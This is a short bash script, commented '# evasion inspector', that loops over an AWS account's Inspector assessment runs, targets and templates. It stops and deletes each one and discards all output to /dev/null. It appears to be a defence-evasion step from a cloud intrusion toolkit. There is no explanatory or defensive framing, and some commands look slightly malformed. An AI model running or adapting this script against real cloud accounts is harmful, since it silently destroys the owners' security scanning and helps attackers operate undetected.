#!/bin/bash

yum install -y jq
opts="q"
# evasion inspector
for row in $(aws inspector list-assessment-runs --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    aws inspector stop-assessment-run --assessment-run-arn "$ID" $opts > /dev/null 2>&1
    aws inspector delete-assessment-run --assessment-run-arn "$ID" $opts > /dev/null 2>&1
done
for row in $(aws inspector list-assessment-targets --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    aws inspector delete-assessment-target --assessment-target-arn "$ID" $opts > /dev/null 2>&1
done
for row in $(aws inspector list-assessment-template --output json --color off --no-cli-pager | jq -r '.[] | @base64'); do
    ID=$(echo "$row" | base64 --decode | jq -r '.[]')
    aws inspector delete-assessment-template --assessment-template-arn "$ID" $opts > /dev/null 2>&1
done